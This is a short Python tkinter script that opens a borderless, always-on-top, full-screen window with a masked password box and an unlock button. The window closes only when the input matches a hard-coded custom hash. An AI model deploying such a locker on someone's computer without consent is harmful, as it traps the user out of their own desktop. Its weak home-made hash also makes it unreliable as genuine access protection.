from tkinter import *
root=Tk()
def topmost():
    root.attributes("-topmost",True)
    root.after(10,topmost)
root.geometry("{}x{}+0+0".format(root.winfo_screenwidth(),root.winfo_screenheight()))
root.resizable(False,False)
root.overrideredirect(True)
topmost()
def myhash(s):
    res=0
    for i in range(len(s)):
        res=((res<<27)|(res>>5))+ord(s[i])
        res&=0xffffffff
    return res
hsh=3026831508
stv=StringVar(root,"")
ent=Entry(root,textvariable=stv,show="*",font=("Consolas",50))
ent.pack()
def verify():
    global hsh,root
    if myhash(stv.get())==hsh:
        root.destroy()
    else:
        stv.set("")
btn=Button(root,text="解锁",font=("Consolas",30),command=verify)
btn.pack()
root.mainloop()
